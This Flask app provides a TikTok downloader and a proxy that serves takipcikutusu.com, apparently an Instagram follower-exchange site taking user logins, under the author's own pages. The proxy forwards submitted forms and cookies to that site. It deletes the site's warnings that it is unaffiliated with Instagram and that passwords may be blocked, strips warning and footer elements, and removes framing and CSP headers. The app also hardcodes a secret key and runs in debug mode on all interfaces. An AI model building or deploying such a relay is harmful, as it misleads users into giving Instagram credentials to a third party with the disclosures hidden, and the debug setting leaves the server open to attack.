from flask import Flask, render_template, request, Response, jsonify
import requests
from bs4 import BeautifulSoup
import re

app = Flask(__name__)
app.secret_key = "zak-tools-secret-2025"

# ============================================================
#   إعدادات
# ============================================================
INSTAGRAM_URL = "https://www.instagram.com/_u.wej"

TAKIPCI_BASE = "https://takipcikutusu.com"
PROXY_PREFIX = "/proxy"
SAVETIK_API = "https://savetik.co/api/ajaxSearch"

HEADERS_TAKIPCI = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A105F) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "ar,fr;q=0.9,en;q=0.8",
    "Referer": TAKIPCI_BASE,
}

HEADERS_SAVETIK = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A105F) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Accept": "*/*",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "https://savetik.co",
    "Referer": "https://savetik.co/ar",
}

TEXTS_TO_HIDE = [
    "Bu sitenin instagram ile hiçbir bağlantısı yoktur",
    "Bu site Havuz Sistemi",
    "Sürekli şifre yanlış hatası",
    "Burayı oku",
    "Giriş uzun sürebilir",
    "ilk girişte şifre yanlış",
    "Instagram şifrenizi bloke edebilir",
    "02/07/2022",
    "Login problems fixed",
    "Fixed the issue",
    "Kullanıcı adı ve şifreniz",
    "Instagram API sistemi",
    "anti-spam",
    "bendim",
    "Şifremi unuttum",
    "Burayı takip etmeye devam edin",
]


@app.context_processor
def inject_globals():
    return {"instagram_url": INSTAGRAM_URL}


# ============================================================
#   الصفحات
# ============================================================
@app.route("/")
def home():
    return render_template("index.html")


@app.route("/tiktok")
def tiktok():
    return render_template("tiktok.html")


@app.route("/member")
def member():
    return render_template("member.html", proxy_url=f"{PROXY_PREFIX}/member")


@app.route("/zak-florist")
def zak_florist():
    return render_template("zak-florist.html", proxy_url=f"{PROXY_PREFIX}/member")


# ============================================================
#   API TikTok
# ============================================================
@app.route("/api/tiktok", methods=["POST"])
def api_tiktok():
    url = request.form.get("url", "").strip()

    if not url:
        return jsonify({"status": "error", "message": "الرجاء إدخال رابط"}), 400

    if "tiktok.com" not in url and "vt.tiktok" not in url:
        return jsonify({"status": "error", "message": "رابط غير صالح"}), 400

    try:
        r = requests.post(
            SAVETIK_API,
            data={"q": url, "lang": "ar", "cftoken": ""},
            headers=HEADERS_SAVETIK,
            timeout=35,
        )
    except Exception as e:
        return jsonify({"status": "error", "message": f"خطأ في الاتصال: {e}"}), 502

    try:
        data = r.json()
    except Exception:
        return jsonify({"status": "error", "message": "رد غير صالح من الخادم"}), 502

    if data.get("status") != "ok":
        return jsonify({"status": "error", "message": "فشل جلب الفيديو"}), 400

    html = data.get("data", "")
    soup = BeautifulSoup(html, "html.parser")

    result = {
        "status": "ok",
        "title": "",
        "thumbnail": "",
        "video_id": "",
        "downloads": [],
    }

    h3 = soup.find("h3")
    if h3:
        result["title"] = h3.get_text(strip=True)

    img = soup.find("img")
    if img and img.get("src"):
        result["thumbnail"] = img["src"]

    hidden = soup.find("input", {"id": "TikTokId"})
    if hidden:
        result["video_id"] = hidden.get("value", "")

    for a in soup.find_all("a", class_=re.compile("tik-button-dl")):
        text = a.get_text(strip=True)
        href = a.get("href", "")
        if not href or "snapcdn" not in href:
            continue

        if "MP3" in text:
            result["downloads"].append({
                "type": "mp3",
                "label": "🎵 تحميل الصوت MP3",
                "url": href,
            })
        elif "HD" in text:
            result["downloads"].append({
                "type": "mp4_hd",
                "label": "🎬 تحميل MP4 HD",
                "url": href,
            })
        elif "MP4" in text:
            result["downloads"].append({
                "type": "mp4",
                "label": "📹 تحميل MP4 عادي",
                "url": href,
            })

    if not result["downloads"]:
        return jsonify({"status": "error", "message": "لم يتم إيجاد روابط تحميل"}), 400

    return jsonify(result)


# ============================================================
#   Proxy takipci
# ============================================================
@app.route(f"{PROXY_PREFIX}/<path:path>", methods=["GET", "POST"])
def proxy(path):
    target_url = f"{TAKIPCI_BASE}/{path}"

    if request.query_string:
        target_url += "?" + request.query_string.decode()

    try:
        if request.method == "POST":
            r = requests.post(target_url, data=request.form, headers=HEADERS_TAKIPCI,
                              cookies=request.cookies, timeout=25, allow_redirects=False)
        else:
            r = requests.get(target_url, headers=HEADERS_TAKIPCI,
                             cookies=request.cookies, timeout=25, allow_redirects=False)
    except Exception as e:
        return f"<h2>خطأ في الاتصال</h2><p>{e}</p>", 502

    content_type = r.headers.get("Content-Type", "")

    if "text/html" in content_type:
        soup = BeautifulSoup(r.text, "html.parser")

        for tag, attr in [("a", "href"), ("form", "action"),
                          ("link", "href"), ("script", "src"),
                          ("img", "src")]:
            for el in soup.find_all(tag):
                if el.get(attr):
                    val = el[attr]
                    if val.startswith("/"):
                        el[attr] = f"{PROXY_PREFIX}{val}"
                    elif val.startswith(TAKIPCI_BASE):
                        el[attr] = val.replace(TAKIPCI_BASE, PROXY_PREFIX)

        for element in soup.find_all(string=True):
            try:
                if not element:
                    continue
                text = element.strip()
                if not text:
                    continue
                if not hasattr(element, "parent") or element.parent is None:
                    continue
                for bad in TEXTS_TO_HIDE:
                    if bad in text:
                        parent = element.parent
                        if parent and parent.name not in ["html", "body"]:
                            parent.decompose()
                        break
            except Exception:
                continue

        try:
            for el in soup.find_all(class_=re.compile(
                    "language|lang|translate|footer|warning|info", re.I)):
                el.decompose()
        except Exception:
            pass

        custom_style = soup.new_tag("style")
        custom_style.string = """
            body { font-family: 'Tahoma', sans-serif !important; }
            .footer, .warning, .info, .language, .lang { display: none !important; }
        """
        if soup.head:
            soup.head.append(custom_style)

        html = str(soup)
    else:
        html = r.content

    resp = Response(html, status=r.status_code,
                    content_type=content_type or "text/html")
    for cookie in r.cookies:
        resp.set_cookie(cookie.name, cookie.value)

    resp.headers.pop("X-Frame-Options", None)
    resp.headers.pop("Content-Security-Policy", None)

    return resp


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
